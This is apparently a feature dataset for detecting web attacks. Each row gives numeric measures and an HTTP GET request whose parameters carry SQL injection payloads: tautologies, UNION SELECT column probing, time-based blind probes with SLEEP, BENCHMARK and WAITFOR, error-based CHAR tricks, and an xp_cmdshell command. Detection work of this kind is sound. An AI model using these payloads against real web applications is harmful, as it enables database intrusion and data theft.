80,2,200,3633,7,42,17,2,1,GET ?phone=exec master..xp_cmdshell 'net users'&id=admin') or '1'='1'/* HTTP/1.1
51,1,200,3768,7,25,7,1,1,GET ?pass=' group by username having 1=1-- HTTP/1.1
70,1,200,5553,21,8,5,1,1,GET ?password= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12--  HTTP/1.1
90,1,200,3765,21,7,3,1,1,GET ?account= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20 HTTP/1.1
147,3,200,6355,30,10,20,1,1,GET ?code=' or ''&'&code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29 HTTP/1.1
201,2,200,6623,115,9,27,1,1,GET ?name=%' AND 8310=8311 AND '%'='&phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
263,2,200,7404,168,6,31,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
62,1,200,1917,30,5,15,1,1,GET ?phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2--  HTTP/1.1
42,1,200,5015,7,15,11,1,1,GET ?password=admin') or '1'='1'# HTTP/1.1
110,1,200,6821,31,4,12,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19# HTTP/1.1
319,2,200,5950,156,7,31,1,1,GET ?phone= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29--  HTTP/1.1
41,1,200,1858,14,8,5,1,1,GET ?password= ORDER BY 31337--  HTTP/1.1
42,1,200,4850,19,8,7,1,1,GET ?password=ORDER BY SLEEP(5)-- HTTP/1.1
118,2,200,5017,57,9,22,1,1,GET ?phone=" or 1=1--&id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL--  HTTP/1.1
31,1,200,7097,7,9,4,1,1,GET ?account=" or ""*" HTTP/1.1
51,2,200,1800,7,24,10,1,1,GET ?email=' or user like '%&pass=admin' # HTTP/1.1
40,1,200,4148,14,7,5,1,1,GET ?account= ORDER BY 31337--  HTTP/1.1
141,2,200,3930,46,26,18,1,1,GET ?email= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15&pass=select session_user; HTTP/1.1
76,1,200,7489,31,8,12,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5# HTTP/1.1
216,1,200,4463,99,5,39,1,1,GET ?email= AND 5650=CONVERT(INT_(SELECT CHAR(113) CHAR(106) CHAR(122) CHAR(106) CHAR(113) (SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END)) CHAR(113) CHAR(112) CHAR(106) CHAR(107) CHAR(113))) HTTP/1.1
167,2,200,3866,54,8,20,1,1,GET ?id=IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--&id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
46,2,200,6747,16,13,7,1,1,GET ?id= ORDER BY 5 &pass=Time-Based: HTTP/1.1
190,2,200,2013,86,12,40,1,1,GET ?username=';WAITFOR DELAY '0:0:30'--&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80)))--  HTTP/1.1
67,2,200,6010,7,29,13,1,1,GET ?code=waitfor delay '00:00:05'&code=" or pg_sleep(5)-- HTTP/1.1
119,2,200,4542,37,10,17,1,1,GET ?email= ORDER BY 22-- &phone= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
251,2,200,2080,90,10,34,1,1,GET ?email= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))&phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26 HTTP/1.1
59,1,200,7898,29,7,14,1,1,GET ?pass=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- HTTP/1.1
59,1,200,2326,29,7,14,1,1,GET ?pass=(SELECT * FROM (SELECT(SLEEP(5)))ecMj)-- HTTP/1.1
90,2,200,6919,18,39,17,1,1,GET ?id=admin') or ('1'='1&pass=' UNION SELECT sum(columnname ) from tablename -- HTTP/1.1
288,2,200,6390,184,6,31,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6 HTTP/1.1
49,1,200,1481,22,8,6,1,1,GET ?password=-1 UNION SELECT 1 INTO @_@ HTTP/1.1
49,2,200,2014,14,10,9,1,1,GET ?mail= ORDER BY 15# &pass= or 0=0 -- HTTP/1.1
146,2,200,5664,54,8,27,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11-- &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7--  HTTP/1.1
80,2,200,1125,14,33,14,2,1,GET ?id= ORDER BY 18-- &id=admin' and substring(password/text()_1_1)='7 HTTP/1.1
46,2,200,6425,7,19,11,1,1,GET ?email='^'&pass=' or user like '% HTTP/1.1
88,1,200,4295,21,8,5,1,1,GET ?password= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18--  HTTP/1.1
193,2,200,2421,47,27,17,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22#&pass=1234 " AND 1=0 UNION ALL SELECT "admin"_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
36,1,200,4228,14,8,4,1,1,GET ?password= ORDER BY 3#  HTTP/1.1
36,1,200,5086,14,8,4,1,1,GET ?password= ORDER BY 3#  HTTP/1.1
121,1,200,7065,30,7,13,2,1,GET login/?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24 HTTP/1.1
39,3,200,5840,7,8,11,1,1,GET ?id=' or ''&'&id=" or ""*" HTTP/1.1
47,2,200,3728,7,16,11,1,1,GET ?email=' or 'a'='a&phone=" or ""=" HTTP/1.1
161,2,200,7956,64,18,31,1,1,GET ?name= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88)))&tel=1)) or benchmark(10000000_MD5(1))# HTTP/1.1
31,1,200,5403,13,4,5,1,1,GET ?user= HAVING 1=1# HTTP/1.1
149,2,200,1161,31,8,18,1,1,GET ?code= '-'&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28--  HTTP/1.1
112,4,200,7490,26,6,11,1,1,GET ?id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23&pass=&&SLEEP(5)-- HTTP/1.1
242,2,200,6117,155,8,20,1,1,GET ?mail= UNION ALL SELECT 1_2_3_4_5#&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
121,2,200,7554,21,15,8,1,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25#&phone=" or true-- HTTP/1.1
32,1,200,2790,14,4,3,1,1,GET ?code= ORDER BY 27  HTTP/1.1
32,1,200,3061,14,4,3,1,1,GET ?code= ORDER BY 27  HTTP/1.1
128,2,200,1977,27,10,13,1,1,GET ?email= AND 1=1 AND '%'='&phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24--  HTTP/1.1
113,2,200,4983,37,7,17,1,1,GET ?name= ORDER BY 22-- &tel= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16 HTTP/1.1
284,2,200,6960,183,4,33,1,1,GET ?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
69,2,200,1006,16,19,10,1,1,GET ?code= ORDER BY 5 &code=1 or benchmark(10000000_MD5(1))# HTTP/1.1
32,1,200,6582,7,10,4,2,1,GET login/?id= and 1=1– HTTP/1.1
88,1,200,1199,31,4,11,1,1,GET ?user= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12 HTTP/1.1
41,2,200,6858,9,13,8,1,1,GET ?account=" "&pass= OR x=y--  HTTP/1.1
254,2,200,7844,145,7,27,1,1,GET ?tel= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11 HTTP/1.1
84,2,200,7428,21,9,9,2,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13-- &tel=" or 1=1/* HTTP/1.1
94,2,200,3958,39,14,17,3,1,GET ?email=admin"/*&pass=AND 2947=LIKE('ABCDEFG'_UPPER(HEX(RANDOMBLOB(500000000/2)))) HTTP/1.1
143,1,200,7642,31,7,11,2,1,GET login/?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29 HTTP/1.1
235,2,200,3795,117,8,44,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88)))&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69)))# HTTP/1.1
80,1,200,1327,42,4,14,1,1,GET ?mail= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(88) CHAR(88)))--  HTTP/1.1
181,2,200,2640,35,10,7,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23-- &phone= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22 HTTP/1.1
207,1,200,7615,137,7,17,2,1,GET login/?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
138,2,200,1782,44,4,17,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3#&id= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22# HTTP/1.1
45,1,200,5154,19,7,6,1,1,GET ?account= ORDER BY 1_SLEEP(5)_3# HTTP/1.1
32,1,200,4247,12,2,6,1,1,GET ?id=  SLEEP(10)   ' HTTP/1.1
123,2,200,7088,37,9,18,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18-- &phone= ORDER BY 29#  HTTP/1.1
113,1,200,6735,31,5,13,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19--  HTTP/1.1
58,1,200,7632,7,34,8,2,1,GET login/?id=select current_setting('hba_file'); HTTP/1.1
81,2,200,4254,14,35,14,1,1,GET ?email= and (select substring(@@version_3_1))='c'&pass= ORDER BY 18  HTTP/1.1
125,2,200,3883,28,12,5,1,1,GET ?username= ORDER BY 27 &pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25 HTTP/1.1
45,1,200,1992,7,16,11,1,1,GET ?code=");waitfor delay '0:0:5'-- HTTP/1.1
37,1,200,1267,14,8,5,1,1,GET ?password= ORDER BY 4--  HTTP/1.1
156,2,200,3486,48,18,25,1,1,GET ?tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16&name=')) or benchmark(10000000_MD5(1))# HTTP/1.1
47,2,200,7586,14,10,8,1,1,GET ?code= ORDER BY 2# &code=' or 1=1– HTTP/1.1
29,1,200,4721,7,10,4,1,1,GET ?username=or 1=1 HTTP/1.1
53,1,200,6044,9,16,9,1,1,GET ?phone=1) or benchmark(10000000_MD5(1))# HTTP/1.1
117,2,200,6112,38,9,13,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15&phone= ORDER BY 26  HTTP/1.1
107,2,200,3895,24,31,10,1,1,GET ?account=admin' or 1=1--&pass=" AND 1=0 UNION ALL SELECT ""_ "81dc9bdb52d04dc20036dbd8313ed055 HTTP/1.1
51,2,200,6397,19,10,9,1,1,GET ?mail=ORDER BY SLEEP(5)#&pass=" or 1=1 HTTP/1.1
181,2,200,5617,31,35,15,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30&id=select user from sysibm.sysdummy1; HTTP/1.1
34,1,200,1928,7,12,4,1,1,GET ?password=" or "x"="x HTTP/1.1
136,1,200,5902,31,4,11,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
136,1,200,4771,31,4,11,1,1,GET ?mail= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
75,2,200,4819,12,33,15,2,1,GET ?id=admin' and substring(password/text()_1_1)='7&id=SLEEP(5)=" HTTP/1.1
121,2,200,2994,21,9,9,2,1,GET ?name= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26-- &tel=or 1=1/* HTTP/1.1
60,2,200,4623,19,11,9,1,1,GET ?email=" or "1"="1&pass= ORDER BY 1_SLEEP(5)_3# HTTP/1.1
270,2,200,1563,163,9,20,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12#&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
109,2,200,2386,46,8,19,1,1,GET ?code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10#&code="-" HTTP/1.1
200,2,200,4376,117,16,23,1,1,GET ?name= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &phone=1) or sleep(5)# HTTP/1.1
63,2,200,5248,21,12,8,1,1,GET ?name= and 1=1–&phone= UNION ALL SELECT 1_2_3_4--  HTTP/1.1
36,1,200,7635,12,10,7,1,1,GET ?password=or SLEEP(5)-- HTTP/1.1
102,1,200,1668,53,7,17,2,1,GET login/?id= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL--  HTTP/1.1
116,2,200,7283,37,6,17,1,1,GET ?id= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16-- &pass= ORDER BY 31337  HTTP/1.1
230,2,200,7227,54,12,26,1,1,GET ?username= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21-- &pass= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25# HTTP/1.1
65,2,200,7310,20,6,9,1,1,GET ?id= ORDER BY 9 &pass= AND 7506=9091 AND ('5913=5913 HTTP/1.1
142,2,200,5588,32,9,19,1,1,GET ?name= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27-- &tel= OR x=y# HTTP/1.1
128,2,200,6900,48,12,16,1,1,GET ?username= AS INJECTX WHERE 1=1 AND 1=1&pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12# HTTP/1.1
34,1,200,6624,7,11,5,2,1,GET ?code=admin" or 1=1/* HTTP/1.1
63,2,200,2172,7,33,8,1,1,GET ?name=select current_user;&phone=admin") or "1"="1 HTTP/1.1
180,2,200,4505,55,8,20,1,1,GET ?id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24-- &id=IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl-- HTTP/1.1
194,2,200,6209,70,7,27,1,1,GET ?phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15-- &id= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13 HTTP/1.1
78,2,200,2069,7,46,14,1,1,GET ?id=select current_setting('password_encryption');&pass=' or '' ' HTTP/1.1
42,1,200,6547,17,4,5,2,1,GET ?pass=RANDOMBLOB(500000000/2) HTTP/1.1
42,1,200,1203,21,4,3,1,1,GET ?user= UNION ALL SELECT 1_2_3 HTTP/1.1
117,2,200,7647,46,16,26,1,1,GET ?email=admin') or ('1'='1'#&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6 HTTP/1.1
110,2,200,5859,45,9,19,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10&pass=-1 UNION SELECT 1 INTO @_@_@ HTTP/1.1
28,1,200,2765,7,6,6,1,1,GET ?mail=' or 1=1# HTTP/1.1
117,2,200,6951,46,14,26,1,1,GET ?phone= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7#&id=admin') or '1'='1'# HTTP/1.1
69,2,200,1483,7,28,13,1,1,GET ?email=admin") or ("1"="1&pass=waitfor delay '00:00:05'# HTTP/1.1
196,2,200,6259,89,11,39,1,1,GET ?account= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8#&pass= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118)))--  HTTP/1.1
220,2,200,4135,109,9,27,1,1,GET ?email= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL_NULL-- &pass= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14 HTTP/1.1
38,2,200,1691,7,10,9,3,1,GET ?mail='/*&pass=" or 1=1/* HTTP/1.1
139,2,200,4635,31,15,20,1,1,GET ?code=admin') or '1'='1&code= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21# HTTP/1.1
54,2,200,5598,14,10,11,1,1,GET ?name= ORDER BY 14-- &tel=1′) and '1′='1– HTTP/1.1
114,2,200,7476,28,12,8,1,1,GET ?username= ORDER BY 12# &pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20--  HTTP/1.1
61,2,200,2240,7,28,11,1,1,GET ?name=) or '1′='1–&phone=select * from pg_group; HTTP/1.1
336,2,200,2367,133,11,53,1,1,GET ?account= AND 5650=CONVERT(INT_(UNION ALL SELECTCHAR(73) CHAR(78) CHAR(74) CHAR(69) CHAR(67) CHAR(84) CHAR(88) CHAR(118) CHAR(120) CHAR(80) CHAR(75) CHAR(116) CHAR(69) CHAR(65) CHAR(113)))&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26# HTTP/1.1
138,1,200,5887,30,4,15,1,1,GET ?code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29_30--  HTTP/1.1
131,2,200,5124,31,21,14,1,1,GET ?id=select current_user;&id= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19 HTTP/1.1
162,2,200,3507,43,10,19,1,1,GET ?email= ORDER BY SLEEP(5)-- &phone= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26--  HTTP/1.1
45,2,200,7434,7,17,9,2,1,GET ?email=" or 1=1/*&pass=or true-- HTTP/1.1
88,2,200,4777,31,9,16,1,1,GET ?name= ORDER BY 1_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_4_5_6_7_8&tel='="or' HTTP/1.1
66,1,200,2118,30,5,15,1,1,GET ?email= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4--  HTTP/1.1
41,1,200,6165,19,5,6,1,1,GET ?phone= ORDER BY 1_SLEEP(5)# HTTP/1.1
73,1,200,5637,21,5,5,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14--  HTTP/1.1
38,1,200,5544,7,11,11,1,1,GET ?user=admin') or '1'='1'# HTTP/1.1
242,2,200,7240,69,8,27,1,1,GET ?code= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19&code= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28 HTTP/1.1
83,4,200,3001,26,9,9,1,1,GET ?email= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13&pass=&&SLEEP(5) HTTP/1.1
54,2,200,4748,9,16,14,1,1,GET ?username='or 1=1 or ''='&pass= OR 1=0--  HTTP/1.1
65,2,200,2847,21,8,14,1,1,GET ?id=")) or (("x"))=(("x&id= UNION ALL SELECT 1_2_3_4 HTTP/1.1
80,2,200,7567,39,11,16,1,1,GET ?account=SLEEP(5)='&pass= UNION SELECT @@VERSION_SLEEP(5)_USER()_4# HTTP/1.1
31,1,200,2422,12,7,5,1,1,GET ?email=pg_SLEEP(5) HTTP/1.1
167,2,200,5200,22,37,15,1,1,GET ?username= and (select substring(@@version_3_1))='S'&pass= UNION ALL SELECT 1_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23_24_25_26_27_28_29# HTTP/1.1
132,2,200,2080,48,9,18,1,1,GET ?name= OR x=y&tel= UNION SELECT @@VERSION_SLEEP(5)_USER()_BENCHMARK(1000000_MD5('A'))_5_6_7_8_9_10_11_12_13_14_15_16_17 HTTP/1.1
29,1,200,5550,9,6,6,1,1,GET ?mail= OR x=x--  HTTP/1.1
30,1,200,5311,9,5,6,1,1,GET ?phone= OR 1=0--  HTTP/1.1
48,2,200,2917,7,13,11,1,1,GET ?name=") or "1"="1"--&phone=or 1=1# HTTP/1.1
62,2,200,7657,10,22,12,1,1,GET ?account= or 1=1#&pass= benchmark(3200_SHA1(1)) ' HTTP/1.1
190,2,200,2986,100,8,29,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10&pass= UNION ALL SELECT @@VERSION_USER()_SLEEP(5)_BENCHMARK(1000000_MD5('A'))_NULL_NULL_NULL_NULL_NULL_NULL_NULL--  HTTP/1.1
104,1,200,1738,41,12,14,1,1,GET ?phone= RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=' HTTP/1.1
114,1,200,2629,30,4,13,1,1,GET ?mail= UNION ALL SELECT 'INJ'||'ECT'||'XXX'_2_3_4_5_6_7_8_9_10_11_12_13_14_15_16_17_18_19_20_21_22_23 HTTP/1.1
